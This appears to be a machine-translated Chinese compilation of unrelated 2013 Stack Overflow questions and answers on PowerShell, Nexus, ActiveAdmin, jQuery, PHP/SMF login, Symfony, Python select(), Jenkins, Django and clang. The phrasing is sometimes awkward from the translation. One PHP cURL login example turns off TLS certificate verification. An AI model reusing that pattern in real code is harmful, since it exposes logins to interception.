我正在使用的代码是；

```
 $path = read-host 'Enter the target drive letter'

    $objects = get-childitem $path -force -recurse 
```

基本上我想要做的是让这个通用搜索工作（扫描用户指定的位置），以便我可以对其进行细化以搜索特定项目，例如按文件类型、大小等搜索的文件。但是，当它运行时，我得到一个当路径包含空格时出错，例如驱动器中的“文档和设置”或“程序文件”文件夹。

有什么办法可以做到这一点而不会出现此错误？我对powershell还是很陌生，我在其他任何地方都看不到这个答案，但如果这已经在其他地方有所介绍，我深表歉意。

## 更新：

它在 Powershell v2.0 上运行。想一想，我认为它与空间有关的原因是因为这些是唯一似乎出错的项目，但消息本身就说明了；

```
 Get-ChildItem : Access to the path 'C:\Documents and Settings' is denied. At
    C:\users\robert\desktop\v1.ps1:5 char:25 + $objects = get-childitem <<<<  $path
    - force -recurse + CategoryInfo : PermissionDenied: (C:\Documents and
    Settings:String) [Get-ChildItem], UnauthorizedAccessException +
    FullyQualifiedErrorId :
    DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand 
```

抱歉，如果这具有误导性，我认为当我以具有不受限制的执行策略的管理员身份运行此程序时，权限应该不是问题，但如果这实际上是导致它的原因，那么有一种方法可以覆盖它，因此它会扫描所有内容目标驱动器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T14:18:13.963

Vista 还是 Windows 7？也许没问题，如果它只是在根目录上的“文档和设置”[连接处绊倒。](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365006%28v=vs.85%29.aspx)联结链接到 c:\users 并且 gci 可能不跟随链接，以防止循环或不完整的搜索。这是偶然发现的另一种方法：

在香草 cmd：

```
cd 'C:\documents and settings'
explorer . 
```

在 Win7 上，我收到一条弹出错误消息：

```
Location is not available
C:\documents and settings is not accessible
Access is denied 
```

没有错误，`cd 'C:\documents and settings'`shell 在该文件夹内返回提示（与链接目标相反，c:\users）；并运行单个命令`explorer 'C:\documents and settings'`启动我的文档文件夹没有错误......但我离题了。

我们不希望递归搜索在无限[循环](http://connect.microsoft.com/PowerShell/feedback/details/776397/robocopy-exe-error-1921-recursive-junctions-reparse-points)中运行或跳过“文档和设置”和用户之间的文件夹。也许 get-childItem 应该以更好的方式处理这个问题，不知道。

同时，您可以通过这种方式排除连接点。我没有以这种方式测试过大型递归搜索，但它们可能会运行更长时间。

```
gci "c:\" -force | where {($_.attributes.toString() -like "*ReparsePoint*") -eq $false} 
```

结果不包括“文档和设置”，除非我们`$true`换成`$false`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:09:35.197

使用：（见附加双引号）

```
$objects = get-childitem "$path" -force -recurse 
```

# ant - 允许重新部署相同的 pom 文件

> ID：14853702
> 
> 赞同：0
> 
> 时间：2013-02-13T12:34:44.037
> 
> 标签：ant, ivy, nexus

`nexus`我们有一个项目，我在其中使用`ant`和将工件上传到存储库`ivy`。事情进展顺利很长一段时间，但现在我们必须部署两次相同的工件（因为我们正在为 windows 和 mac 生成相同的产品）。应用程序的代码是一样的，只是改变了包装。我已将部署过程配置为使用 Maven 分类器。问题是上传是从 2 台不同的机器完成的，因为每台机器都有适合目标平台的构建环境。

所以，第一次部署是正确的，它上传：

*   myproduct-1.0.pom
*   myproduct-1.0-mac.zip

当我尝试部署 Windows 工件时，将部署

*   myproduct-1.0.pom
*   myproduct-1.0-win32.msi

它失败是因为存储库策略不允许重新部署（并且应该保持这种方式），因此即使 pom 内容相同，尝试为相同的工件和版本部署新的 pom 文件也会失败。

此外，将来我们可能会遇到类似的问题，即在不同的机器上部署相同产品和版本但不同分类器的各种工件，但在不同的构建过程中。

如果在使用 pom 部署分类工件时，如果存储库中已存在相同的 pom 文件不会失败，是否可以告诉 nexus 不会失败？如果不可能，我知道使用不同分类器部署各种工件的唯一方法是同时部署它们。这是真的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T10:22:20.953

最后，我创建了一个任务，只部署了没有任何分类器的 pom，并将 windows 和 mac 工件的部署修改为只部署包而不部署 pom：

1.  部署没有分类器的 pom
2.  使用分类器 (mac) 部署 mac 工件
3.  使用分类器部署 win artficat (win32)

当我认为我会抱怨时，Nexus 在部署工件而不部署 pom 文件时不会抱怨。

我觉得这是一个肮脏的把戏，但它有效:)

# ruby-on-rails - ActiveAdmin“无限循环”：没有错误消息，CPU 和内存使用增加，强制终止并重新启动服务器

> ID：14853703
> 
> 赞同：5
> 
> 时间：2013-02-13T12:34:47.293
> 
> 标签：ruby-on-rails, ruby, activeadmin

我在 ActiveAdmin 中遇到了这个问题。有时，当我访问带有未定义变量的页面时，服务器会启动一种“无限循环”，不显示错误消息并增加 CPU 和内存使用率，直到我不得不杀死它。

这是一个例子：

我有一个 Answers 表，这是 answers.rb 中的一段代码：

```
show :title => proc { answer.id } do
  panel 'Answer' do
    .
    .
  end
  .
  .
end 
```

这段代码不起作用并显示错误：“未定义的局部变量或方法'answer'”

我必须写

```
show :title => proc { @answer.id } do 
```

解决这个问题。

但是我有一个用户表，这是 users.rb 中的一段代码：

```
show :title => proc{ @user.name } do
  panel 'User details' do
    .
    .
  end
  .
  .
end 
```

如果我写

```
show :title => proc{ user.name } do 
```

我得到了上面详述的问题，没有错误消息并且 CPU 和内存使用量增加。

**我真的不想知道为什么这两段代码之间有不同的行为，我想知道在这种情况下如何显示错误消息而不是没有错误和 cpu / 内存增加。**

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T14:43:37.820

根据评论，听起来像是分页问题。尝试：

```
class User < ActiveRecord::Base
  paginates_per 25
end 
```

看看这是否有帮助。在 AA 0.4.0 中发现了一个问题：[https ://github.com/gregbell/active_admin/issues/996](https://github.com/gregbell/active_admin/issues/996)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T17:37:05.523

我终于发现出了什么问题！

在用户秀上，`a SELECT * FROM users`请求被执行，试图创建超过 300 000 个活动记录对象，防止服务器显示“未定义变量错误”并增加 CPU 和内存使用率。

对于 Answer show 上的相同错误，我认为`SELECT * FROM answers`执行了请求但错误正确显示，因为 answers 表的记录少得多。但是，经过检查，我发现它是错误的，没有执行 SELECT * 请求。

然后我检查了 answers.rb 和 users.rb 之间的差异，我在 users.rb 中发现了这个：

```
ActiveAdmin.register User do

  scope_to :association_method => :scoped do
    User.includes([:current_device => [:current_device_config, :current_push_config],:current_web_device => [:current_device_config, :current_push_config]])
  end 
```

检查 Active Admin 文档后，我意识到它不正确。

我把它移到：

```
controller do
  def scoped_collection
    User.includes([:current_device => [:current_device_config, :current_push_config], :current_web_device => [:current_device_config, :current_push_config]])
  end 
```

现在，没有`SELECT * FROM users`执行并且正确显示“未定义变量“用户”错误。

谢谢，你真的帮了我

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-02T18:09:48.970

我也遇到了这个问题，并且应该指出，如果您使用 better_errors 或任何其他在出现异常时将转储范围内变量值的工具，您最终可能会执行和转储 ActiveRelation 对象。在我的例子中，为了转储实际上只包含 ActiveRelation 的变量的值，将获取表中的数百万行。

我正在使用 Pow，当这种情况发生时，ruby 进程将继续运行，直到机器内存不足并且无法使用。杀死红宝石进程是恢复的唯一方法。

为了解决这个问题，我需要运行`rails server`老式的方法并直接检查输出。这让我可以立即杀死红宝石。也可以进行检查`log/development.log`。

# javascript - find() 函数在 IE8 和 IE7 中返回 null

> ID：14853704
> 
> 赞同：0
> 
> 时间：2013-02-13T12:34:54.673
> 
> 标签：javascript, jquery

我在 XMLResponse 上工作并尝试从 xmlresponse 中找到计数值。为此我编写了这段代码

这是我在警告框中的回复

![回复](../Images/8928f8add418654ecd436a844cb29892.png)

```
cnt = Math.ceil($(xmlResponse1).find("count").text()/250);
alert(cnt); 
```

它在 IE9 中工作，但返回 null ni IE8 和 IE7。

请帮我。应该做些什么来解决这个问题。

谢谢并恭祝安康

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:45:06.057

该`$()`函数不适合解析 XML。[`$.parseXML`](http://api.jquery.com/jQuery.parseXML/)在将元素包装在 jQuery 对象中之前使用。

```
var cnt = Math.ceil($($.parseXML(xmlResponse1)).find("count").text()/250);
alert(cnt); 
```

[**您可以在这个Fiddle**](http://jsfiddle.net/8erZG/)中看到它在 IE8 中工作[](http://jsfiddle.net/8erZG/)

 **或者以更易于阅读的方式，缓存已解析的 XML 文档：

```
var xmlDOM = $.parseXML(xmlResponse1);
var cnt = Math.ceil( $(xmlDOM).find("count").text()/250 ); 
```

[更新的演示](http://jsfiddle.net/8erZG/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:41:14.403

我认为 text() 在 ie7-8 中不起作用，试试 html()：

```
cnt = Math.ceil($(xmlResponse1).find("count").html()/250); 
```

看看这个问题：[jquery ie8 get text value = Object does not support this property or method](https://stackoverflow.com/questions/11167656/jquery-ie8-get-text-value-object-doesnt-support-this-property-or-method)**

# php - 如何在不使用 SMF 登录表单的情况下从另一个表单登录 SMF 论坛

> ID：14853707
> 
> 赞同：0
> 
> 时间：2013-02-13T12:34:59.983
> 
> 标签：php, authentication, smf-forum

我在常规网站上有一个登录表单。如果用户使用此表单登录我的网站，他们应该同时登录论坛。怎么做 ？有人说使用 SSI.php 但这个文件给了我另一种形式来验证 SMF。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:24:16.450

您可以使用 CURL Php 来实现这一点。

这是一个例子

```
$username="username"; 
$password="password"; 
$url="http://www.simplemachines.org/"; 
$cookie="cookie.txt"; 

$postdata = "user=".$username."&passwrd=".$password."&cookielength=-1"; 

$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie); 
curl_setopt ($ch, CURLOPT_REFERER, $url); 

curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$result = curl_exec ($ch); 

echo $result;  
curl_close($ch); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:06:23.903

好的，所以如果您只想执行与登录表单相同的 POST 请求，但来自另一个 php 代码，您可能会对这个函数感兴趣：

* * *

大部分代码来自[http://www.jonasjohn.de/snippets/php/post-request.htm](http://www.jonasjohn.de/snippets/php/post-request.htm)

```
function post_request($url, $data, $referer='') {

    // Convert the data array into URL Parameters like a=b&foo=bar etc.
    $data = http_build_query($data);

    // parse the given URL
    $url = parse_url($url);

    if ($url['scheme'] != 'http') { 
        die('Error: Only HTTP request are supported !');
    }

    // extract host and path:
    $host = $url['host'];
    $path = $url['path'];

    // open a socket connection on port 80 - timeout: 30 sec
    $fp = fsockopen($host, 80, $errno, $errstr, 30);

    if ($fp){

        // send the request headers:
        fputs($fp, "POST $path HTTP/1.1\r\n");
        fputs($fp, "Host: $host\r\n");

        if ($referer != '')
            fputs($fp, "Referer: $referer\r\n");

        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ". strlen($data) ."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data);

        $result = ''; 
        while(!feof($fp)) {
            // receive the results of the request
            $result .= fgets($fp, 128);
        }
    }
    else { 
        return array(
            'status' => 'err', 
            'error' => "$errstr ($errno)"
        );
    }

    // close the socket connection:
    fclose($fp);

    // split the result header from the content
    $result = explode("\r\n\r\n", $result, 2);

    $header = isset($result[0]) ? $result[0] : '';
    $content = isset($result[1]) ? $result[1] : '';

    // return as structured array:
    return array(
        'status' => 'ok',
        'header' => $header,
        'content' => $content
    );
} 
```

data 参数是一个数组，如下所示

```
$post_data = array(
        'login' => 'yourLogin',
        'pass' => 'yourPass',
        ...
); 
```

然后只需使用 url 调用方法（原始表单的操作？）：

```
$result = post_request('http://www.smf-forum1.com/login.php', $post_data); 
```

希望这是您的预期，如果不是，我还没有理解问题：/

# symfony - 将一个表单嵌入到另一个 symfony2

> ID：14853709
> 
> 赞同：0
> 
> 时间：2013-02-13T12:35:02.030
> 
> 标签：symfony, doctrine-orm, symfony-2.1

我有两个实体表格，分别称为“订单”和“地址”。我想将地址表格嵌入到订单表格中。两个实体都与用户列有关系。

**地址实体**

```
class Address
{
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /**
     * @ORM\Column(type="string", length=128)
     */
    protected $type;    

    /**
     * @ORM\ManyToOne(targetEntity="Root\UserBundle\Entity\User", inversedBy="address")
     * @ORM\JoinColumn(name="user", referencedColumnName="id")
     * @ORM\ManyToOne(targetEntity="Orders", inversedBy="address")
     * @ORM\JoinColumn(name="user", referencedColumnName="user")
     */     
    protected $user; 
```

**订单实体**

```
class Orders
{
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /**
     * @ORM\Column(type="string", length=128)
     */
    protected $status;    

    /**
     * @ORM\ManyToOne(targetEntity="Root\UserBundle\Entity\User", inversedBy="orders")
     * @ORM\JoinColumn(name="user", referencedColumnName="id")
     * @ORM\OneToMany(targetEntity="Address", mappedBy="orders")
     * @ORM\JoinColumn(name="user", referencedColumnName="user")
     */     
    protected $user; 
```

**订单表格**

```
namespace Root\ContestBundle\Form\Front;

use Symfony\Component\Form\AbstractType;
use Symfony\Component\Form\FormBuilderInterface;
use Symfony\Component\OptionsResolver\OptionsResolverInterface;
use Root\ContestBundle\Entity\Address;
use Root\ContestBundle\Form\Front\AddressType;
class OrdersType extends AbstractType
{
    public function buildForm(FormBuilderInterface $builder, array $options)
    {
        $builder->add('address', 'collection', array('type' => new AddressType()));
        $builder
        ->add('termsAccepted');

    } 
```

但我收到如下错误

```
An exception has been thrown during the rendering of a template ("Neither property "address" nor method "getAddress()" nor method "isAddress()" exists in class "Root\ContestBundle\Entity\Orders"") 
```

那么我在代码中犯了什么错误。帮帮我

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-03T12:07:48.757

也许为时已晚，但这是我的答案。几天前我发现了 symfony，所以我不是专家。对我来说似乎很尴尬的事情很少。

在 Adress Entity 上，我认为你应该这样做：

```
/** @ORM\OneToMany(targetEntity="Order", mappedBy="adress") */
protected $orders; 

public function addOrder(Order $order){
    $this->orders[] = $order;
}

public function removeOrder(Order $order){
    $this->orders->removeElement($order);
}

public function getOrders(){
    return $this->orders;
} 
```

在订单实体上，我认为您应该拥有：

```
/**
 * @ORM\ManyToOne(targetEntity="Address", inversedBy="orders")
 * @ORM\JoinColumn(name="idAdress", referencedColumnName="id")
 */     
protected $adress;

public function setAdress($adress){
    $this->adress = $adress;
}

public function getAdress(){
    return $this->adress;
} 
```

最后是您的 OrderType，我认为您应该拥有：

```
public function buildForm(FormBuilderInterface $builder, array $options){
    $builder->add('adress',new AdressType());
} 
```

希望对您有所帮助。

# python - 在选择中处理超出范围

> ID：14853712
> 
> 赞同：1
> 
> 时间：2013-02-13T12:35:14.500
> 
> 标签：python, linux, ipc, pipe

许多（> 1000）工人（流程）做了一些工作并希望将他们的工作结果保存在数据库中。工作结果是 JSON 对象。工人每秒产生 1-5 个 JSON 对象。数据库保护程序是独立的进程。用于将 JSON 对象从 worker 传输到 saver 的单向连接是 multiprocessing.Pipe。管道数量等于工人数量。

在保护程序过程中定期调用：

```
def recv_data(self):
    data = []
    for pipe in self.data_pipe_pool:
        if pipe.poll():
            data.append(pipe.recv())
    return data 
```

self.data_pipe_pool - 来自工人的管道列表。

如果我运行约 100 名工人，一切正常。如果我运行 >1000 个工人，我会得到异常：

```
2013-02-13T15:17:40.731429
Traceback (most recent call last):
  File "saver.py", line 44, in run
    profile = self.poll_data()
  File "saver.py", line 116, in poll_data
    ret = self.recv_data()
  File "saver_unit.py", line 127, in recv_data
    if pipe.poll():
IOError: handle out of range in select() 
```

我知道这是由于`select()`电话引起的，并且：

> FD_SETSIZE 在 GNU/Linux 系统中通常定义为 1024

但是在哪里调用`select`？如果在`pipe.poll()`，为什么我超过 FD_SETSIZE 限制，我`pipe.poll()`单独调用 1 个管道？我在哪里可以通过此调用观看 python 语言源`select`？

什么解决方法不超过`FD_SETSIZE`限制或不使用`select`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:43:32.353

如果您查看[`select`手册页](http://linux.die.net/man/2/select)，您将看到：

> 使用 fd 为负数或等于或大于 FD_SETSIZE 的值执行 FD_CLR() 或 FD_SET() 将导致未定义的行为。

这意味着 if`select`在您的调用中在幕后使用`poll`（这似乎很可能），并且您的文件描述符大于`FD_SETSIZE`（如果您有超过 1000 个管道，则很可能）那么结果可以是任何东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T14:17:40.500

你有没有想过使用[beanstalkd](https://github.com/earl/beanstalkc)之类的东西，因为听起来你有一个从工作人员到服务器的管道，而通常你会有 1000 个工作人员，然后有 10 个服务器从结果队列中读取以将它们存储在数据库中。

好处是，您的工作人员可能花费更多的时间来完成他们的工作，而不是与服务器交谈，但您已经为该服务器打开了一条管道。

你可以有一个“工作队列”，让你的 1000 名工人从中获取，还有一个他们存储结果的“结果队列”。此后，您可以让许多服务器从“结果队列”中获取存储在数据库中。

这是一个很长的说法“至少你不会用完文件句柄”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T13:58:05.117

我使用 epoll 解决了这个问题。解决方法很简单：

```
def set_data_pipe_poll(self, data_pipe_poll):
    self.epoll = select.epoll()
    for p in data_pipe_poll:
        self.epoll.register(p, select.EPOLLIN)
    self.data_pipe_poll = data_pipe_poll

def recv_data(self):
    data = []
    events = self.epoll.poll(timeout = 0)
    for fileno, _ in events:
        p = filter(lambda x: x.fileno() == fileno, self.data_pipe_poll)[0]
        data.append(p.recv())
    return data 
```

当我打电话时，`epoll.poll()`我不打电话`select`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-05T17:30:37.340

我有类似的问题。我为每个工作人员使用了 multiprocessing.Queue，当工作人员数量约为 600 时，队列方法以`IOError: handle out of range in select()`.

我在官方错误跟踪器中发现了导致问题的问题[。](http://bugs.python.org/issue10527)它在 2.7.4 中修复（我有 2.7.3）。更新python包解决了这个问题。

# javascript - 表准备好 jquery 必须触发

> ID：14853718
> 
> 赞同：0
> 
> 时间：2013-02-13T12:35:35.453
> 
> 标签：javascript, jquery, html

当“myTable”在页面上时，我需要触发一个脚本，但它稍后由 ajax 呈现，我无法编辑 ajax。我可以将此脚本留在页面下方，并且仅在表格出现时才会触发？我该怎么做呢？

谢谢....

```
<html>
<body>
<script>
    $('#myTable').ready(function(){

        alert('ready');

    });

</script>
</body>
</html> 
```

稍后呈现的表格

```
<table id="myTable">

<tr>
    <td>t</td>
    <td>t</td>
    <td>t</td>
    <td>t</td>
</tr>

    <tr>
    <td>t</td>
    <td>t</td>
    <td>t</td>
    <td>t</td>
</tr>

</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:56:36.210

您可以在脚本开头设置 ajax 完整功能并检查其中是否存在表格。

```
$.ajaxSetup({
    complete: function () {
        if ($("#mytable").length>0) do_something;
    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:43:48.317

您应该在创建表后创建一个触发器函数。

```
function create_element() {
    // Create an element
    $('body').append("<p>Testing..</p>")
    // Trigger
    $('body').trigger('elementCreated');
}

$(document).ready(function () {
    $("body").on("elementCreated", function (event) {
        alert('One more');
    });
}); 
```

[http://jsfiddle.net/GT7eB/](http://jsfiddle.net/GT7eB/)

# jenkins - Jenkins 使用电子邮件插件发送附件

> ID：14853722
> 
> 赞同：1
> 
> 时间：2013-02-13T12:35:51.277
> 
> 标签：jenkins, jenkins-plugins

当 Jenkins 中的测试失败时，我正在尝试附加一个文件。

我正在使用电子邮件扩展插件作为尝试实现这一目标的一种手段，但我被语法难住了。

如果我只是将“index.php”（不带引号）放在附件字段中，它将正确发送附件。

如果我尝试进一步进入工作区，例如“myfolder/myfile.php”（不带引号），电子邮件将不会发送。我尝试了许多变体，使用通配符并尝试专门针对文件但没有运气。

我当然看过这里[http://ant.apache.org/manual/Types/fileset.html](http://ant.apache.org/manual/Types/fileset.html)但似乎没有任何效果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T15:02:35.327

尝试`**/myfile.php`

`myfile.php`无论目录结构如何，这都会查找

# javascript - 使用 jquery 将重点放在文本框上

> ID：14853725
> 
> 赞同：0
> 
> 时间：2013-02-13T12:36:27.387
> 
> 标签：javascript, jquery

我有两个这样的复选框：

```
<input id="isGenericPassword" name="isGenericPassword"
       onclick="IsGenericOrUnique(this.id);" type="checkbox" value="true" />
<input name="isGenericPassword" type="hidden" value="false" />
<input checked="checked" id="isUniquePassword" name="isUniquePassword"
       onclick="IsGenericOrUnique(this.id);" type="checkbox" value="true" />
<input name="isUniquePassword" type="hidden" value="false" />
<input id="UniquePassword" name="UniquePassword" style="display:none"
       type="text" value="" /> 
```

在 document.ready 中，我有

```
 $('#isUniquePassword').is(':checked')
     ? $("#UniquePassword").show()
     : $("#UniquePassword").hide(); 
```

如果选中复选框，则相关文本框可见。

我在单击 isUniquePassword 复选框时隐藏了文本框 UniquePassword

```
$("#isUniquePassword").click(function () {
    $("#UniquePassword").toggle(this.checked);
    if ($("#isUniquePassword").is(':checked')) {
        // unique password gets focus only if related checkbox is checked
        $("#UniquePassword").focus();
    }
}); 
```

并在用户试图离开而不输入任何内容时显示对话

```
 $("#UniquePassword").blur(function () {
     if ($("#isUniquePassword").is(':checked') &&
         $("#UniquePassword").val() == '')
     {
         $("#dialog-RecipientEmail-error").dialog("open");                        
     }
 }); 
```

并在确定按钮上单击该对话框，再次将焦点设置到该文本框，以便输入值

```
 $("#dialog-RecipientEmail-error").dialog({
      autoOpen: false,
      resizeable: false,
      width: 300,
      modal: true,
      buttons: {
          "OK": function () {
              $(this).dialog("close");
              $("#UniquePassword").focus();
          }
      }
  }); 
```

不，我希望如果选中 isGenericPassword 或未选中 isUniquePassword，那么我应该得到那个错误对话框

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:39:21.737

$("#UniquePassword").focus(); 不会聚焦该字段，而是会触发与焦点事件绑定的动作。要聚焦一个字段，您需要获取 HTML 元素的句柄

`$("#UniquePassword").get(0).focus();`

那应该行得通。

# html - 在phonegap中使用backboneJS + requireJS + textJS

> ID：14853726
> 
> 赞同：0
> 
> 时间：2013-02-13T12:36:27.980
> 
> 标签：html

更新了我之前的问题：

是否可以在电话间隙应用程序中使用backbone.js + require.js + text.js。

我有一个在backbone.js 中实现的解决方案，require.js bootstrap.js。是否可以在 phonegap 中运行它

因为我有一个在backbone.js 中构建的应用程序，它又使用requrieJS、textJS 来异步加载html 片段。（XHR - XmlHttpRequests）

由于这种异步调用，它无法在本地执行，需要托管在服务器中。

在这种情况下，我是否可以直接在 phonegap 中使用这个 html5 解决方案。它需要在本地运行。]

或者是否可以使用 JQM 进行异步调用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:42:09.887

该代码清楚地表明您缺少依赖项。离线在这里并没有真正发挥作用，您的代码将无法在线或离线工作。如果它是任何一种方式，那么你在这两者之间有差异:)

# django - 将 UUID 实现为主键

> ID：14853728
> 
> 赞同：15
> 
> 时间：2013-02-13T12:36:32.490
> 
> 标签：django, uuid

我需要将 UUID 实现为主键，但我不确定如何在 Django 中实现。

我的代码

```
class LinkRenewAd(models.Model): # This model will generate the uuid for the ad renew link
    def make_uuid(self):
        return str(uuid.uuid1().int>>64)

    uuid = models.CharField(max_length=36, primary_key=True, default=make_uuid, editable=False)
    main = models.ForeignKey(Main)
    expiration_date = models.DateTimeField()
    date_inserted = models.DateTimeField(auto_now_add=True)
    date_last_update = models.DateTimeField(auto_now=True) 
```

当我尝试在 South 上生成这个新模型时，我得到了错误：

```
TypeError: make_uuid() takes exactly 1 argument (0 given) 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-09-03T11:40:47.743

Django 1.8 带有一个内置的[UUID 字段](https://docs.djangoproject.com/en/1.8/ref/models/fields/#django.db.models.UUIDField)

例子：

```
import uuid
from django.db import models

class MyUUIDModel(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-13T13:12:14.187

`self`意味着你需要传入一个实例。在您的情况下，您没有实例，这就是为什么您会看到缺少参数的奇怪错误。

要解决您的问题，请将生成字段的方法移出模型类：

```
def make_uuid():
    return str(uuid.uuid1().int>>64)

class Foo(models.Model):
    id = models.CharField(max_length=36, primary_key=True, default=make_uuid) 
```

然而，这不是理想的解决方案。最好创建一个自定义数据库字段。由于这是一个常见问题，因此有很多版本。我个人喜欢[大卫克莱默的版本](https://github.com/dcramer/django-uuidfield/blob/master/uuidfield/fields.py)。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-13T13:00:43.607

您正在传递函数，它将在 中的某个地方调用`models.Charfield`，而不是从 的某个对象`LinkRenewAd`，因此没有任何对象 ( `self`) 的实例被传递给这个方法，它实际上需要一个。因此，改为将其设为[静态函数](https://stackoverflow.com/questions/735975/static-methods-in-python)或 lambda 函数，或将其定义为类的非成员。

# c++ - c++11：clang 在我的模板定义中拒绝 numeric_limits<>，而 gcc 接受它——这是对的吗？

> ID：14853731
> 
> 赞同：2
> 
> 时间：2013-02-13T12:36:34.850
> 
> 标签：c++, gcc, c++11, clang

违规代码：

```
template <class Bar, 
         size_t MAX_SIZE = std::numeric_limits<size_t>::max()>
size_t foo(Bar const& b) { omitted... } 
```

它在 gcc 4.7.2 上使用`-std=c++11`. 在 clang 3.0 上，我收到以下错误：

```
foo.hpp:35:28: error: non-type template argument of type 'unsigned long' is not an integral constant expression
         size_t MAX_SIZE = std::numeric_limits<size_t>::max()>
                           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```

据我所知，我应该能够`numeric_limits`在 c++11 中以这种方式使用。这里是clang错了，还是我不知道什么？

编辑：

编译标志是：`clang++ -o foo.o -c -W -Wall -Wextra -Werror -std=c++11 -stdlib=libc++ -g -I. foo.cpp`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T13:01:58.567

您的代码使用 clang++ 3.2 编译得很好，请参见[此处](http://liveworkspace.org/code/44xxiv%244)。

我会说您的代码没有问题，但您应该升级到更新版本的 clang。

注意：由于编译器错误（感谢@Xeo），代码无法使用英特尔 C++ 编译器 13.0.1 进行编译：

```
Compilation finished with errors:
source.cpp(6): internal error: assertion failed: ensure_il_scope_exists: NULL IL scope (shared/cfe/edgcpfe/il.c, line 7439)

size_t MAX_SIZE = std::numeric_limits<size_t>::max()>
^

compilation aborted for source.cpp (code 4) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:43:20.690

要在 clang 中使用 C++11 库功能，您需要使用 libc++ 标准库实现，否则您会从不支持 C++11 的 GCC 4.1.2 获得古老的库

请参阅[https://stackoverflow.com/a/14790442/981959](https://stackoverflow.com/a/14790442/981959)和[https://stackoverflow.com/a/14150421/981959](https://stackoverflow.com/a/14150421/981959)以及许多其他问题。

# php - 在 Symfony2 中更改模板/视图位置

> ID：14853736
> 
> 赞同：1
> 
> 时间：2013-02-13T12:36:43.603
> 
> 标签：php, symfony, twig

我将致力于为每个域具有不同主题的项目（同一个应用程序将服务于多个域）。

1.  我需要完全在应用程序文件夹之外更改模板的位置，可能在另一个卷上
2.  我需要使它与具有多个主题的多个域一起使用-我想存在缓存问题

S 如何用 Symfony2 和 twig 做这些事情？

编辑：我会试着问这个问题：我需要重写什么或在哪里获得自定义逻辑来定位 symfony 用来呈现页面的特定模板。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:33:20.663

我不能说你问题的第一点是否是一种不好的做法（即使可能也不知道，但我会说是的）。

但是，我要做的是某种“管理器”，负责根据您自己的逻辑选择哪种模板渲染。动作和视图之间的某种“中间级别”。

您可以将其创建为服务并在任何地方使用，而无需每次都实例化它。
它可以读取配置文件，甚至（但弹性较小）使用类内部配置。

算法可能是这样的：

*   考虑您的要求
*   “吃掉”数据并“吐出”正确的模板（名称）
*   将模板（名称）传递给您的视图
*   扩展（动态）您的经理提供的模板

请不要问我一些代码，因为它可能会导致数百行:)

# asp.net-mvc-3 - mvc 控制器创建

> ID：14853741
> 
> 赞同：0
> 
> 时间：2013-02-13T12:36:55.750
> 
> 标签：asp.net-mvc-3, visual-studio-2010, c#-4.0, asp.net-mvc-4, c#-3.0

在创建 MVC3 项目时，我遇到了这个问题。我创建了 Movies.cs 并在为这个模型创建控制器时，我做了以下事情。

*   右键单击 Controllers 文件夹，然后选择 Add and Controller
*   将控制器名称设置为 MoviesController
*   选择模板：具有读/写操作和视图的控制器，使用实体框架
*   选择模型类：电影（McvDemo.Models）
*   选择数据上下文类：MovieContext (McvDemo.Models)
*   选择视图 Razor (CSHTML)
*   单击添加。

它处理了一段时间并给了我这个错误。

> 无法检索元数据 gor“MvcDemo.Models.Movies”。找不到请求的 .NET 框架数据提供程序。它可能没有安装。

那是什么意思？如果有人能指出我的答案。

# iphone - 根据 SOAP 消息值显示下一个视图

> ID：14853743
> 
> 赞同：0
> 
> 时间：2013-02-13T12:37:05.200
> 
